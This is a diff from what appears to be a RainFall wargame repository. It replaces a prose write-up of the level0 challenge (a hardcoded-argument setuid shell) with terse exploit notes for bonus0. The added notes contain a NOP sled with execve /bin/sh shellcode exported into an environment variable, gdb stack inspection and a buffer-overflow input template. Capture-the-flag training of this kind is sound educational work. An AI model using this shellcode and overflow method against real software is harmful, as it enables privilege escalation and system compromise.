@@ -1,44 +1,22 @@
-# Exploiting a Simpler Vulnerability in a C Program
+bonus0@RainFall:~$ python -c 'print("\x90" * 200 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")' > /tmp/exp
+bonus0@RainFall:~$ cat /tmp/exp
+��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1���
+                                                                                               Qh//shh/bin��̀
+bonus0@RainFall:~$ export SHELLCODE=$(cat /tmp/exp)
+bonus0@RainFall:~$ gdb bonus0 
 
-## Vulnerability Overview
 
-This program allows the user to execute a shell (`/bin/sh`) but only if the first command-line argument matches the value `423`. If the value does not match, the program outputs `No !` and terminates.
+(gdb) x/100 $esp
+[enter]
+[enter]
+[enter]
+[enter]
+[enter]
+[enter]
+[enter]
+0xbffff82d:  "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
 
----
 
-## Exploitation
+convert to decimal 0xbffff82d, + 20, then convert to hex, addr
 
-### Behavior of the Program
-1. The program uses `atoi()` to convert the first command-line argument (`argv[1]`) into an integer, stored in a variable.
-2. If `num != 423`, the program writes `"No !"` to the standard error and terminates.
-3. If `num == 423`, the program:
-   - Prepares the arguments to execute `/bin/sh`.
-   - Sets the real and effective user and group IDs to match the program’s execution context.
-   - Executes `/bin/sh` with `execv()`, granting the user shell access.
-
-### Exploit
-To exploit this program:
-1. Run it with `423` as the first argument:
-   ```bash
-   ./level0 423
-   ```
-   If the program is set with the **setuid** or **setgid** bit (e.g., owned by `root`), this would escalate privileges, granting a root shell.
-
----
-
-## Mitigation Strategies
-
-1. **Avoid Hardcoding Values**:
-   - Do not rely on simple, hardcoded conditions like `num == 423` to control access to sensitive functionality.
-
-2. **Remove Setuid Permissions**:
-   - Avoid granting unnecessary setuid or setgid permissions to programs.
-
-3. **Perform Input Validation**:
-   - Validate all user inputs thoroughly, even for seemingly harmless cases.
-
----
-
-## Conclusion
-
-This program is relatively simple to exploit due to its reliance on a single integer condition and its use of privileged operations (`setresuid`, `execv`).
+(python -c 'print("A"*22)';python -c 'print("B"*9 + "replace little endian addr here" + "A"*7)';cat -) | ./bonus0 
